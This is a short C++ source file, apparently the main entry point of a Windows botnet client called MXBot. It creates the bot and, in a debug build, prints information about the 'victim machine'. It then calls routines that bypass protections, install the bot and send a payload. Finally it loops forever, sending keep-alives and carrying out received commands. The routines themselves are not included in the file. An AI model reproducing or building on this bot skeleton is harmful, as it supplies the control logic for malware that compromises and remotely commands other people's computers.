// xbot.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "MXBot.h"
#ifdef DMODE
#include "Tools.h"
#endif

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	MXBot *Bot = new MXBot;


#ifdef DMODE
	RegularConsole* Console = new RegularConsole;
	Bot->WriteVictimMachineInfoToConsole();
#endif

	Bot->BypassModule();
	Bot->ActivateInstallationModule();

	//printf("%s", STRINGS.kernel32dll.c_str());

	Bot->SendPayloadOfTheDay();
	
	

	for (;;)
	{
		Sleep(30000); // Przerwa miêdzy keep-alive'em
		Bot->SendKeepAlive();
		Bot->CheckCommandsAndMakeThem();
	}

	delete Bot;
}